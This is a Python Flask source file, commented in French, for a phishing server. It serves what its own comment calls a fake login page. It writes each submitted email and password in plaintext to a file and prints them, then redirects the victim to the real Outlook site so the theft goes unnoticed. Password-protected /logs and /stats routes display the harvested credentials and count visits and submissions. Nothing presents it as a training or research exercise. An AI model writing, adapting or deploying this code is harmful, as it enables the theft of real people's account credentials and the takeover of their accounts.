from flask import Flask, render_template, request, redirect, Response
import os

app = Flask(__name__)

# Définition du mot de passe admin
ADMIN_PASSWORD = "Saouda2025!!"

# Variables pour stocker les statistiques
total_visits = 0
total_submissions = 0

# Route qui affiche la fausse page de connexion
@app.route("/")
def login_page():
    global total_visits
    total_visits += 1  # Incrémenter le compteur de visites
    return render_template("login.html")

# Route qui récupère les identifiants saisis et les stocke
@app.route("/submit", methods=["POST"])
def submit():
    global total_submissions
    total_submissions += 1  # Incrémenter le compteur de soumissions
    
    email = request.form["email"]
    password = request.form["password"]
    
    # Enregistrer les identifiants dans un fichier texte
    with open("credentials.txt", "a") as file:
        file.write(f"Email: {email} | Password: {password}\n")
    
    print(f"Identifiants reçus - Email: {email}, Password: {password}")
    
    # Redirige l'utilisateur vers le vrai site Outlook
    return redirect("https://outlook.live.com/")

# Route protégée pour afficher les identifiants
@app.route("/logs")
def logs():
    auth = request.authorization
    if not auth or auth.password != ADMIN_PASSWORD:
        return Response("Accès refusé !", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
    
    try:
        with open("credentials.txt", "r") as file:
            data = file.read().replace("\n", "<br>")
        return f"<h1>Identifiants enregistrés :</h1><p>{data}</p>"
    except FileNotFoundError:
        return "<h1>Aucun identifiant enregistré pour l'instant.</h1>"

# Route protégée pour afficher les statistiques
@app.route("/stats")
def stats():
    auth = request.authorization
    if not auth or auth.password != ADMIN_PASSWORD:
        return Response("Accès refusé !", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
    
    return f"Nombre total de visites : {total_visits}<br>Nombre total de soumissions : {total_submissions}"

# Lancer le serveur Flask
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=True)
